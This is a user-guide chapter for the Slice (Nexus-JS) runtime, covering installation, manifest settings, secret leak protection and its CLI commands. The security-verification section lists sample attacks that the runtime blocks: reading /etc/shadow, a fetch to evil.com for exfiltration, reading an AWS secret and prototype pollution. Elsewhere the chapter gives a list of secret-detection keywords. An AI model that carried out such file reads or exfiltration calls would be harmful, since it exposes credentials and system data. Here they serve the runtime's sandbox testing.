# Chapter 01: Installation, Upgrading, Quickstart, `slice.toml` & Complete CLI Reference

This chapter is your complete day-one guide to installing, upgrading, configuring, and operating **Slice (Nexus-JS)** (`v0.9.3`). By the end of this chapter, you will know how to install and update Slice on any operating system, scaffold a new TypeScript project, configure your `slice.toml` manifest and `.env` vault, run live development with `< 3 ms` `--watch` reloads, use the interactive `slice repl` shell, and master all 13 CLI commands.

---

## 1. Installing Slice (`Windows`, `Linux`, `macOS`, & `Docker`)

Slice is engineered in 100% pure Rust with **zero external C/C++ compiler dependencies** (no `cmake`, `ninja`, `python`, or multi-gigabyte V8 prebuilts required). It compiles into a single self-contained native binary (`slice` on Linux/macOS, `slice.exe` on Windows).

### 1.1 Prerequisites
- **Rust Toolchain (`1.80+`):** Install via [rustup.rs](https://rustup.rs) (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh` on Linux/macOS, or `rustup-init.exe` on Windows).
- **Git:** To clone and pull updates from the repository.

### 1.2 One-Step Installer Scripts (Recommended)

The repository includes automated installer scripts in [`scripts/install.ps1`](file:///p:/opensource/slice/scripts/install.ps1) and [`scripts/install.sh`](file:///p:/opensource/slice/scripts/install.sh) that build the optimized release binary (`lto = "fat"`, `opt-level = 3`), copy it to `~/.slice/bin`, and verify your installation.

**Windows (PowerShell):**
```powershell
git clone https://github.com/siktec-lab/slice.git
cd slice
powershell -ExecutionPolicy Bypass -File .\scripts\install.ps1
```
Add `$HOME\.slice\bin` to your user `PATH` if it is not already present:
```powershell
[Environment]::SetEnvironmentVariable("Path", $env:Path + ";$HOME\.slice\bin", "User")
```

**Linux & macOS (Bash / Zsh):**
```bash
git clone https://github.com/siktec-lab/slice.git
cd slice
./scripts/install.sh
export PATH="$HOME/.slice/bin:$PATH"
```

### 1.3 Manual Build with Cargo

If you prefer to build and place the binary yourself:
```bash
cargo build --release
```
The compiled binary is produced at:
- **Linux / macOS:** `./target/release/slice`
- **Windows:** `.\target\release\slice.exe`

### 1.4 Running Slice in Docker

Slice includes a production multi-stage [`Dockerfile`](file:///p:/opensource/slice/Dockerfile) at the repository root:
```bash
docker build -t slice-runtime .
docker run --rm slice-runtime info
docker run --rm slice-runtime doctor
```

---

## 2. Updating & Upgrading Slice

When a new release or commit is available, upgrading your local `slice` binary and re-packing your `.cas` bundles takes less than a minute:

### 2.1 Upgrading the `slice` CLI Binary

**Linux / macOS:**
```bash
cd /path/to/slice
git pull origin main
cargo build --release
./scripts/install.sh
slice info
```

**Windows (PowerShell):**
```powershell
cd P:\opensource\slice
git pull origin main
cargo build --release
powershell -ExecutionPolicy Bypass -File .\scripts\install.ps1
slice info
```

### 2.2 Upgrading Pre-Packed `.cas` Archives and Standalone Binaries
If you deploy pre-packed `.cas` archives (`slice pack`) or single-file executables (`slice compile`), re-run `slice pack` or `slice compile` after upgrading so your bundles include the latest Oxc compiler lowerings and embedded runtime binary:
```bash
slice pack ./my-app ./my-app.cas --static=./public
slice compile ./my-app -o ./my-app-bin --static=./public
```
If you are running `slice serve --tenant-dir=./tenants`, overwriting `./tenants/<tenant>.cas` in place triggers an **automatic zero-downtime hot-swap** on the very next HTTP request without restarting `slice serve`.

---

## 3. Verifying Your Host Environment (`slice info` & `slice doctor`)

After installing or upgrading, run `slice info` and `slice doctor` to inspect your OS completion rings (`io_uring` on Linux, `IOCP` on Windows), hardware Memory Protection Keys (`MPK/PKU`), pre-warmed `Boa` ES2024 realm pool, and 5-vector security containment:

```bash
slice info
slice doctor
```

Example `slice doctor` output:
```text
=========================================================================
  SLICE (NEXUS-JS) PRODUCTION ENVIRONMENT & KERNEL DOCTOR
=========================================================================
  [OK] Host OS / Architecture     : windows / x86_64
  [OK] Direct Completion Ring     : Windows NT I/O Completion Port (IOCP Direct Kernel Ring)
  [OK] Kernel SQPOLL Ring Mode    : Standard Completion Ring (IOCP / Direct Ring)
  [OK] Registered Fixed Slab Bufs : 128 x 64 KB (8 MB Pre-Registered)
  [OK] Memory Protection Domain   : PKEY 0x2 (PKRU Mask 0xffffffcf, Hardware MPK: false)
  [OK] CAS Cache-Line Alignment   : 64 bytes (Zero-Copy mmap ready)
  [OK] Pre-Warmed Boa ES2024 Pool : 2 Ready Realms (Zero-Init SLICEBOA Fast Path)
  [OK] Current Host Process RSS   : 15812 KB (15.44 MB)
  [OK] OCap / SES Security Audit  : 5/5 Attack Vectors Blocked
=========================================================================
```

---

## 4. 5-Minute Developer Quickstart: Your First Slice App

Let's scaffold, run, watch, test, and serve a new TypeScript edge project in 5 steps.

### Step 1: Scaffold the Project (`slice init`)
```bash
slice init ./hello-slice
cd ./hello-slice
```
This creates two files:
- `slice.toml`: Your declarative security policy, resource limits, and entrypoint configuration.
- `src/index.ts`: Your TypeScript entrypoint.

### Step 2: Run Your TypeScript Code (`slice run`)
You can run the project directory directly (Slice automatically reads `slice.toml`), or pass a specific `.ts` file:
```bash
slice run
# Or with microsecond execution telemetry and pre-warmed realm pool:
slice run --warm --metrics
```
You can also use the shorthand `slice <file.ts>`:
```bash
slice ./src/index.ts
```

### Step 3: Live Development with `< 3 ms` Reloads (`slice run --watch`)
Start the built-in watcher while editing files in `src/`, `slice.toml`, or `.env`:
```bash
slice run --watch --metrics
```
Whenever you save a file, Slice's Oxc compiler re-bundles your TypeScript dependency graph and re-executes in **under 3 milliseconds**.

### Step 4: Turn It Into a Web API (`slice serve`)
Replace `src/index.ts` with a standard WinterTC `export default { fetch }` server:
```typescript
export default {
    fetch(req: Request): Response {
        const url = new URL(req.url);
        const visits = Slice.kv.incr("quickstart:visits", 1);
        return Response.json({
            message: "Hello from Slice MicroVM!",
            path: url.pathname,
            visits,
        });
    }
};
```
Test it immediately with `--smoke-test` (which sends 2 pipelined HTTP/1.1 `Keep-Alive` requests and exits) or run it live on port 3000:
```bash
slice serve --smoke-test
slice serve --port=3000 --workers=4
```

### Step 5: Compile a Single-File Native Binary (`slice compile`)
Package your entire application into a standalone executable that runs on any machine without needing `slice`, `node`, or `src/` installed:
```bash
slice compile . -o ./hello-slice-app
./hello-slice-app --warm --metrics
```

---

## 5. Complete `slice.toml` Manifest Guide

When you run `slice run`, `slice serve`, `slice test`, `slice pack`, or `slice compile` inside a project directory, Slice automatically loads `slice.toml` (and embeds it inside `.cas` archives and compiled binaries!).

Here is a complete, annotated `slice.toml` showing every supported section and field:

```toml
[package]
# Name of your service or application
name = "billing-edge-service"
# Semantic version of your package
version = "1.2.0"
# Default TypeScript or JavaScript entrypoint
entrypoint = "./src/index.ts"

[limits]
# Maximum deterministic CPU instruction fuel per execution or HTTP request.
# Protects your server against accidental infinite loops or ReDoS attacks.
fuel = 50_000_000

# Maximum per-tenant memory ceiling in kilobytes (16384 KB = 16 MB).
# Enforced across isolate heap allocations and Slice.kv entries.
memory_kb = 16384

[capabilities]
# Allowed filesystem read path prefixes (normalized; automatically blocks '..' traversal).
# Omit or leave empty [] for pure-compute zero filesystem access.
allow_read = ["/tmp", "./config", "./public"]

# Allowed filesystem write/append/mkdir/unlink path prefixes.
allow_write = ["/tmp"]

# Allowed outbound network host:port endpoints for fetch() / Slice.fetchSync().
# Use ["*"] to allow all public hosts (Cloud Metadata 169.254.169.254 and RFC1918 private IPs remain blocked!).
allow_net = ["api.stripe.com:443", "127.0.0.1:18095"]

# Optional .env file loaded automatically into process.env and env().
# Any key matching *_SECRET*, *_TOKEN*, *_KEY*, *_PASSWORD*, or *_PRIVATE*
# (except PUBLIC_KEY / PUBLISHABLE_KEY) is automatically registered into the Egress DLP guard!
env_file = ".env"

[capabilities.env]
# Explicit non-secret environment variables injected into the isolate compartment
NODE_ENV = "production"
SERVICE_REGION = "us-east-1"
PUBLIC_KEY_ID = "pk_live_9001"
```

### How CLI Flags Interact with `slice.toml`
- **Additive Capabilities:** Passing `--allow-read=/data`, `--allow-write=/tmp/out`, `--allow-net=example.com:443`, `--allow-env=FOO=bar`, or `--env-file=.env.local` on the command line **adds** those permissions to the capabilities declared in `slice.toml`.
- **Limit Overrides:** Passing `--fuel=1000000` or `--memory=4194304` on the CLI overrides the `fuel` and `memory_kb` values from `slice.toml`.

---

## 6. `.env` Files & Automatic Secret DLP (`--env-file`)

Most runtimes load `.env` files into global `process.env` with zero protection against accidental logging (`console.log(process.env)`) or prompt-injected outbound `fetch()` exfiltration.

In Slice, when you pass `--env-file=.env` (or set `env_file = ".env"` in `slice.toml`):
1. **Standard `.env` Syntax Support:** Supports `KEY=VALUE`, `export KEY="VALUE"`, single-quoted `'VALUE'`, double-quoted `"VALUE"` (with `\n`, `\r`, `\t`, `\"` unescaping), and inline `# comments`.
2. **Accessible via `process.env` and `env()`:** All loaded variables are available in `process.env.KEY` (and injected as the second parameter `fetch(req, env, ctx)` in `slice serve`), as well as via the global `env("KEY")` function.
3. **Automatic Egress DLP Registration:** Any `.env` key whose name contains `SECRET`, `TOKEN`, `KEY`, `PASSWORD`, or `PRIVATE` (excluding `PUBLIC_KEY` and `PUBLISHABLE_KEY`) with a value at least 6 characters long is **automatically registered into Slice's Egress DLP firewall**:
   - If your code (or a third-party dependency) tries to print that secret to `stdout`, return it in an HTTP response, or send it in an outbound `fetch()` URL, header, or body — in **plaintext**, **Base64**, or **Base64URL** — Slice blocks the leak and traps with `EGRESS_SECRET_LEAK_BLOCKED`!

---

## 7. Complete CLI Reference (All 13 Subcommands)

### 7.1 `slice init [dir]`
Scaffolds a new TypeScript edge project containing `slice.toml` and `src/index.ts`.
```bash
slice init ./my-service
```

---

### 7.2 `slice run [target] [flags]`
Executes a `.ts`/`.js` file, a project folder (with `package.json`, `slice.toml`, or `src/index.ts` + `node_modules/`), or a pre-packed `.cas` archive. If `[target]` is omitted, executes `entrypoint` from `./slice.toml`.

| Flag | Description |
| :--- | :--- |
| `--allow-read=<prefix>` | Grant read access to paths starting with `<prefix>` (comma-separated or repeatable). |
| `--allow-write=<prefix>` | Grant write/append/mkdir/unlink access to paths starting with `<prefix>`. |
| `--allow-net=<host:port>` | Grant outbound `fetch()` network access to `<host:port>` (or `*` for public internet). |
| `--allow-env=<KEY=VAL>` | Inject `KEY=VAL` (or import `KEY` from host environment) into the isolate. |
| `--env-file=<path>` | Load `.env` file into `process.env` / `env()` with automatic Egress DLP secret protection. |
| `--audit-egress=<secret>` | Explicitly register `<secret>` into the Egress DLP guard (blocks raw, Base64, and Base64URL leaks). |
| `--fuel=<u64>` | Set maximum CPU instruction fuel budget (default: `50,000,000`). |
| `--memory=<bytes>` | Set maximum per-isolate memory ceiling in bytes (default: `16,777,216`). |
| `--warm` | Pre-warm the thread-local `BOA_CONTEXT_POOL` and `__slice_rc` bundle closure before measurement. |
| `--watch` | Watch source files (`src/`, `slice.toml`, `.env`) and live-reload in `< 3 ms` on save. |
| `--watch-once` | Run once, wait for a single file modification, re-execute in `< 3 ms`, and exit (ideal for CI/scripts). |
| `--deterministic[=<seed>]` | Enable deterministic `Math.random()`, `Date.now()`, `performance.now()`, and `fetch()` cassette replay (default seed: `42`). |
| `--metrics` | Print microsecond instantiation, execution, total time, tier, memory bytes, and `stat` syscall count. |
| `--quiet` / `-q` | Suppress script `stdout` output (useful when benchmarking with `--metrics`). |

**Examples:**
```bash
# Run a TypeScript file with explicit read/net permissions and .env file
slice run ./src/worker.ts --env-file=.env --allow-read=./data --allow-net=api.github.com:443

# Run an entire folder application with warm pool telemetry
slice run ./tests/apps/02-npm-ecosystem-suite --warm --metrics

# Live development mode with automatic < 3 ms rebuilds on save
slice run ./src/index.ts --watch --metrics
```

---

### 7.3 `slice test [target] [flags]`
Runs Slice's built-in **Time-Travel Test Runner** (`"slice:test"` / `"node:test"` / `"bun:test"`). Automatically discovers all `*.test.ts`, `*.spec.ts`, `*.test.js`, and `*.spec.js` files in `[target]` (defaulting to `.`) or runs a single test file.
Before every `test(...)` / `it(...)` block, Slice takes a `< 5 us` VFS (`node:fs`) + `Slice.kv` snapshot and restores it in `finally`, guaranteeing zero state leakage between tests.

| Flag | Description |
| :--- | :--- |
| `--filter=<substring>` | Only run tests whose `"Suite > Test Name"` contains `<substring>`. |
| `--deterministic[=<seed>]` | Run all tests with a deterministic PRNG and virtual clock (default seed: `20261024`). |
| `--env-file=<path>` | Load `.env` variables and auto-register secrets into the Egress DLP guard. |
| `--allow-read=<prefix>` | Grant additional read prefixes (defaults to allowing `/tmp` and system temp dir). |
| `--allow-write=<prefix>` | Grant additional write prefixes (defaults to allowing `/tmp` and system temp dir). |
| `--allow-net=<host:port>` | Grant outbound network hosts during tests. |
| `--fuel=<u64>` | Override fuel limit per test file. |
| `--memory=<bytes>` | Override memory limit per test file. |
| `--json` | Output a machine-readable JSON test report (`files`, `total`, `passed`, `failed`, `skipped`, `checkpointsRestored`). |

**Examples:**
```bash
# Run all discovered *.test.ts and *.spec.ts files in the project
slice test

# Filter tests by name and run with a fixed deterministic seed
slice test ./tests/state_machine.test.ts --filter="rollback" --deterministic=20261024

# Emit JSON report for CI pipelines
slice test --json
```

---

### 7.4 `slice serve [target] [flags]`
Launches the multi-tenant WinterTC HTTP/1.1 `Keep-Alive` and pipelined MicroVM web server (`152,376 req/s` Tier-0 CAS, `107,274 req/s` Tier-1 WinterTC).

| Flag | Description |
| :--- | :--- |
| `--port=<u16>` | TCP listening port (default: `3000`). |
| `--workers=<usize>` | Number of shared-nothing worker threads (default: `clamp(num_cpus, 1, 8)`). |
| `--static=<dir>` | Ingest and serve static web assets from `<dir>` out of memory with BLAKE3 `ETag` `304` support (`< 2 us`). |
| `--tenant-dir=<dir>` | Dynamically route `X-Slice-Tenant: <id>` or `/t/<id>/...` to `<dir>/<id>.cas` with zero-downtime live hot-swapping. |
| `--env-file=<path>` | Load `.env` variables and register sensitive keys into the Egress DLP guard. |
| `--audit-egress=<secret>` | Scan all HTTP responses, SSE streams, and outbound `fetch()` calls for raw/Base64 leaks of `<secret>`. |
| `--deterministic[=<seed>]` | Enable deterministic PRNG, virtual clock, and `fetch()` cassette replay across served requests. |
| `--max-requests=<usize>` | Exit cleanly after serving `<usize>` requests (ideal for automated load tests). |
| `--smoke-test` / `--once` | Bind an ephemeral port, send 2 pipelined HTTP/1.1 `Keep-Alive` requests, print response headers/bodies, and exit. |

**Examples:**
```bash
# Serve a full-stack TypeScript app + ./public static assets on port 8080 across 8 workers
slice serve ./src/server.ts --static=./public --port=8080 --workers=8 --env-file=.env

# Serve a multi-tenant directory of .cas bundles with zero-downtime hot-swapping
slice serve --port=3000 --workers=8 --tenant-dir=./tenants

# Verify your HTTP handler with a quick self-contained smoke test
slice serve ./src/server.ts --smoke-test
```

---

### 7.5 `slice pack <input_file_or_dir> <output.cas> [flags]`
Compiles TypeScript via Oxc, bundles transitive ESM/CommonJS/JSON modules from `src/` and `node_modules/`, tree-shakes unused barrel submodules, optionally embeds `--static` web assets and `slice.toml`, and writes a 64-byte cache-line aligned BLAKE3 `.cas` archive.

| Flag | Description |
| :--- | :--- |
| `--entry=<rel_path>` | Override the entrypoint file when packing a folder (e.g., `--entry=./src/worker.ts`). |
| `--static=<dir>` | Embed an entire static asset directory (`HTML`/`CSS`/`JS`/`SVG`/`WASM`) into the `.cas` archive. |

**Examples:**
```bash
slice pack ./src/index.ts ./bundle.cas
slice pack ./my-fullstack-app ./production.cas --static=./public
```

---

### 7.6 `slice compile <input_file_or_dir_or_cas> [-o <output_binary>] [flags]`
Embeds a `.ts` script, folder application (including `node_modules/` and `slice.toml`), or `.cas` archive directly into a standalone, zero-dependency native executable (`SLICEEXE` format).

| Flag | Description |
| :--- | :--- |
| `-o <path>` / `--output=<path>` | Output executable path (automatically appends `.exe` on Windows if omitted). |
| `--entry=<rel_path>` | Override the entrypoint file when compiling a folder. |
| `--static=<dir>` | Embed a static frontend directory directly into the standalone binary. |

**Examples:**
```bash
slice compile ./tests/apps/01-fintech-checkout -o ./fintech-service
./fintech-service --warm --metrics
```

---

### 7.7 `slice inspect <archive.cas | script.ts | folder>`
Inspects the internal structure of any `.cas` archive, `.ts`/`.js` script, or project folder:
- For `.cas` archives: Prints the CAS format version, entrypoint hash, embedded static asset count, and every module's BLAKE3 hash, 64-byte aligned byte offset, source size, and bytecode size, followed by the bytecode disassembly.
- For `.ts`/`.js` files or folders: Compiles the source and disassembles the resulting `SLICESNP` opcodes (`CONST_NUM`, `MONO_FOR_T2`, `EXPORT_SYM`) or `SLICEBOA` bundle payload.

```bash
slice inspect ./production.cas
slice inspect ./src/index.ts
```

---

### 7.8 `slice repl`
Launches an interactive **SES-Locked TypeScript/JavaScript Compartment Shell** where you can test expressions, inspect fuel and memory consumption in real time, and verify Object-Capability permissions.

| REPL Command | Description |
| :--- | :--- |
| `:help` / `.help` | Show available REPL meta-commands. |
| `:metrics` | Display current Execution Tier, CPU Fuel (`consumed/limit`), Memory (`used/limit`), and Hardware `PKEY`. |
| `:caps` | Display active `CapabilityToken` (`allow_read`, `allow_write`, `allow_net`, `allow_env`) loaded from `./slice.toml`. |
| `:reset` / `.clear` | Reset the compartment state, SES intrinsics, and fuel counter to a clean slate. |
| `:quit` / `:q` / `.exit` | Exit the interactive shell. |

**Example REPL Session:**
```text
$ slice repl
Slice (Nexus-JS) v0.9.3 Interactive SES-Locked Compartment Shell
Commands: :help, :metrics, :caps, :vars, :reset, :quit
slice(ses)> const price: number = 250 * 4;
=> 1000
slice(ses)> fib(20)
=> 6765
slice(ses)> :metrics
Tier: Tier2PeakNative | Fuel: 31/50000000 | Memory: 4096/16777216 B | PKEY: 0x1
slice(ses)> Object.prototype.hacked = true
[TRAP] OCap Violation: Compartment 'repl-tenant' attempted to mutate frozen SES intrinsic 'Object.prototype'
slice(ses)> :reset
Compartment reset (fresh SES intrinsics & fuel counter).
slice(ses)> :quit
```

---

### 7.9 `slice mcp [flags]`
Starts the built-in **JSON-RPC 2.0 Model Context Protocol (`2024-11-05`)** server over `stdin`/`stdout` for AI coding assistants (Claude Code, Cursor, custom LLM agents). Exposes `slice_eval_ts`, `slice_kv_get`, `slice_kv_set`, and `slice_checkpoint`.

| Flag | Description |
| :--- | :--- |
| `--allow-read=<prefix>` | Grant VFS read prefix to the MCP host compartment. |
| `--allow-write=<prefix>` | Grant VFS write prefix to the MCP host compartment. |
| `--allow-net=<host:port>` | Grant outbound network host to the MCP host compartment. |
| `--audit-egress=<secret>` | Block raw, Base64, or Base64URL exfiltration of `<secret>` across all MCP tool calls. |
| `--smoke-test` | Run a 6-step JSON-RPC 2.0 self-test (`initialize`, `tools/list`, `slice_eval_ts`, `slice_kv_set`, `slice_kv_get`, `slice_checkpoint`) and exit. |

---

### 7.10 `slice doctor`
Runs a comprehensive diagnostic check of your OS kernel completion ring (`io_uring` / `IOCP`), registered fixed slab buffers, hardware `MPK/PKU` status, CAS 64-byte cache-line alignment, pre-warmed `Boa` pool, process RSS, and 5-vector OCap/SES security containment.

---

### 7.11 `slice verify-security`
Executes all 5 multi-tenant attack vectors against live `SliceIsolate` compartments and verifies 100% deterministic containment:
1. **Vector 1:** SES Intrinsic Lockdown (`Object.prototype.polluted = true`) -> Blocked (`IntrinsicMutationBlocked`)
2. **Vector 2:** OCap VFS Token (`fs.readFileSync("/etc/shadow")`) -> Blocked (`FsReadDenied`)
3. **Vector 3:** OCap Network Token (`fetch("https://evil.com/exfil")`) -> Blocked (`NetAccessDenied`)
4. **Vector 4:** OCap Env Token (`env("AWS_SECRET_ACCESS_KEY")`) -> Blocked (`EnvAccessDenied`)
5. **Vector 5:** Deterministic CPU Fuel Cage (`while (true) {}`) -> Preempted (`CpuFuelExhausted`)

---

### 7.12 `slice microvm-bench [--tenants=1000] [--json]`
Spawns `N` isolated tenant compartments (`default: 1000`) in a single process and benchmarks:
- Min / P50 / P99 isolate cold-start latency (`0.98 us` min on Linux `x86_64`)
- Total 1,000-tenant swarm boot time (`1.26 ms`) and per-tenant memory footprint (`4,096 B`)
- 500-module Zero-Stat CAS graph resolution (`0` OS `stat()` syscalls)
- 10,000 kernel completion ring operations
- Tier-2 `Fib(40)` + `10M` numeric loop compute kernel

---

### 7.13 `slice info` (or `slice --version` / `slice -v`)
Prints the Slice version, host OS/architecture, active I/O completion engine, CAS version, compiler pipeline, and security architecture summary.
